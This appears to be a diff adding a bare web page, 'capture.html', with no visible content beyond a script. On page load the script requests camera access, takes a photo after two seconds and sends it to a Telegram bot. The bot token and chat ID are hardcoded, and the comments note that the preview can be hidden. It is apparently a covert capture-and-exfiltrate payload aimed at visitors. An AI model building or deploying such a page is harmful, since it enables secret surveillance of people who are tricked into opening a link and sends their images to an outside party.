@@ -1,0 +1,78 @@
+<!-- capture.html (Second Page) -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture</title>
+</head>
+<body>
+
+<script>
+    window.onload = function() {
+        // Request access to the user's camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                // Display the camera stream on the page (you can hide it if needed)
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Append the video element to the body (you can hide it if needed)
+                document.body.appendChild(video);
+
+                // Capture photo after a short delay (adjust as needed)
+                setTimeout(function () {
+                    capturePhoto(stream);
+                }, 2000); // 2000 milliseconds (2 seconds) delay
+            })
+            .catch(function (error) {
+                console.error('Error accessing camera:', error);
+            });
+    };
+
+    function capturePhoto(stream) {
+        // Create a canvas element to capture the photo
+        var canvas = document.createElement('canvas');
+        var video = document.querySelector('video');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        var ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Stop the camera stream
+        stream.getTracks().forEach(function (track) {
+            track.stop();
+        });
+
+        // Convert the canvas content to a data URL
+        var imageDataUrl = canvas.toDataURL('image/jpeg');
+
+        // Send the image to Telegram Bot API
+        // You need to replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual values
+        var botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
+        var chatId = '-1001590820560';
+
+        // Example using fetch API
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                photo: imageDataUrl,
+                caption: 'Smile captured!',
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Photo sent to Telegram:', data);
+        })
+        .catch(error => {
+            console.error('Error sending photo to Telegram:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
